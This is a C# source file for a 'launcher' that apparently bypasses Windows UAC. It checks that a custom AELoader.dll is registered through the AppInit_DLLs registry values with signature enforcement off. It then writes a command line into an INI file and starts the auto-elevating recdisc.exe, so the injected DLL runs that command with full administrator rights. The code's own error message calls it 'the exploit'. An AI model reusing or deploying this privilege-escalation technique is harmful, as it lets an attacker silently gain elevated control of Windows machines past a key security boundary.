using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using ww898.AELauncher.Impl;
using ww898.AELauncher.Impl.Interop;

namespace ww898.AELauncher
{
  // ReSharper disable once InconsistentNaming
  public static class AEProcess
  {
    private const string Sys32Dir = @"%SystemRoot%\System32";
    private const string Wow64Dir = @"%SystemRoot%\SysWOW64";

    private const string AeLoaderDll = "AELoader.dll";

    private const string Sys32AeLoaderDll = Sys32Dir + @"\" + AeLoaderDll;
    private const string Wow64AeLoaderDll = Wow64Dir + @"\" + AeLoaderDll;

    private const string DonorExe = Sys32Dir + @"\recdisc.exe";

    private const string KeyPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";

    private const string ValueAppInitDlls = "AppInit_DLLs";
    private const string ValueLoadAppInitDlls = "LoadAppInit_DLLs";
    private const string ValueRequireSignedAppInitDlls = "RequireSignedAppInit_DLLs";

    public static bool DebugMode;

    public static void Start(string executable, string arguments = null)
    {
      Run(executable, arguments);
    }

    public static void Start(string executable, string[] arguments)
    {
      if (arguments == null)
        throw new ArgumentNullException(nameof(arguments));
      var builder = new StringBuilder();
      foreach (var argument in arguments)
        builder.Append(' ').Append(EscapeArgument(argument));
      Run(executable, builder.ToString());
    }

    private static void Run(string executable, string arguments = null)
    {
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        throw new PlatformNotSupportedException("Windows is required");

      if (!File.Exists(Environment.ExpandEnvironmentVariables(Sys32AeLoaderDll)))
        throw new FileNotFoundException(Sys32AeLoaderDll + " wasn't found");

      if (Directory.Exists(Environment.ExpandEnvironmentVariables(Wow64Dir)))
        if (!File.Exists(Environment.ExpandEnvironmentVariables(Wow64AeLoaderDll)))
          throw new FileNotFoundException(Wow64AeLoaderDll + " wasn't found");

      if (!ElevationUtil.IsUacEnabled())
        throw new Exception("UAC is disabled");

      using (var key = Registry.LocalMachine.OpenSubKey(KeyPath))
      {
        if (key == null)
          throw new Exception(KeyPath + @" was not found");
        if (!(key.GetValue(ValueAppInitDlls) is string paths))
          throw new Exception(ValueAppInitDlls + @" value was not found");
        if (!(key.GetValue(ValueLoadAppInitDlls) is int load))
          throw new Exception(ValueLoadAppInitDlls + @" value was not found");
        if (!(key.GetValue(ValueRequireSignedAppInitDlls) is int requireSigned))
          throw new Exception(ValueRequireSignedAppInitDlls + @" value was not found");

        if (paths.IndexOf(AeLoaderDll, StringComparison.OrdinalIgnoreCase) < 0)
          throw new Exception(AeLoaderDll + " wasn't registered");
        if (load == 0)
          throw new Exception(ValueLoadAppInitDlls + " wasn't enabled");
        if (requireSigned != 0)
          throw new Exception(ValueRequireSignedAppInitDlls + " wasn't disabled");
      }

      var currentProcess = Process.GetCurrentProcess();
      switch (ElevationUtil.GetElevationType(currentProcess))
      {
      case TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault:
        throw new Exception("A limited administrator account is required to run the exploit");
      case TOKEN_ELEVATION_TYPE.TokenElevationTypeFull:
        ExecuteDirect(executable, arguments);
        break;
      case TOKEN_ELEVATION_TYPE.TokenElevationTypeLimited:
        var iniFile = Environment.ExpandEnvironmentVariables($"%ProgramData%\\AELoader.{unchecked((uint) currentProcess.Id)}.ini");
        try
        {
          WriteIniFile(iniFile, executable, arguments);
          ExecuteDonor(TimeSpan.FromSeconds(10));
          if (File.Exists(iniFile))
            throw new InvalidOperationException("AELoader.dll wasn't loaded in the donor process");
        }
        finally
        {
          if (File.Exists(iniFile))
            File.Delete(iniFile);
        }
        break;
      default:
        throw new ArgumentOutOfRangeException();
      }
    }

    private static void ExecuteDonor(TimeSpan timeout)
    {
      var timeoutInMilliseconds = checked((int) timeout.TotalMilliseconds);
      using (var process = Process.Start(new ProcessStartInfo(Environment.ExpandEnvironmentVariables(DonorExe)) {UseShellExecute = true}))
      {
        if (process == null)
          throw new InvalidOperationException("Failed to run the donor executable");
        if (!process.WaitForExit(timeoutInMilliseconds))
          throw new TimeoutException("Failed to wait the donor process");
      }
    }

    private static void ExecuteDirect(string executable, string arguments = null)
    {
      if (executable == null)
        throw new ArgumentNullException(nameof(executable));
      using (var process = Process.Start(new ProcessStartInfo(executable, arguments) {UseShellExecute = true}))
        if (process == null)
          throw new InvalidOperationException("Failed to run the executable directly");
    }

    private static void WriteIniFile(string iniFile, string executable, string arguments = null)
    {
      var commandLine = EscapeArgument(executable);
      if (!string.IsNullOrEmpty(arguments))
        commandLine += ' ' + arguments;

      // Bug: GetPrivateProfileIntW() / GetPrivateProfileStringW() support only ASCII or UTF-16LE with no BOM!
      var encoding = new UnicodeEncoding(false, false);

      using (var writer = new StreamWriter(File.OpenWrite(iniFile), encoding))
      {
        writer.WriteLine("[AELoader]");
        if (DebugMode)
          writer.WriteLine("EnableEventLogs=1");
        writer.WriteLine("CommandLine={0}", commandLine);
      }
    }

    private static string EscapeArgument(string argument)
    {
      if (argument == null)
        throw new ArgumentNullException(nameof(argument));
      if (argument.Length == 0)
        return @"""""";
      var tmp = Regex.Replace(argument, @"(\\*)""", @"$1\\$0");
      return Regex.Replace(tmp, @"^(.*\s.*?)(\\*)$", @"""$1$2$2""");
    }
  }
}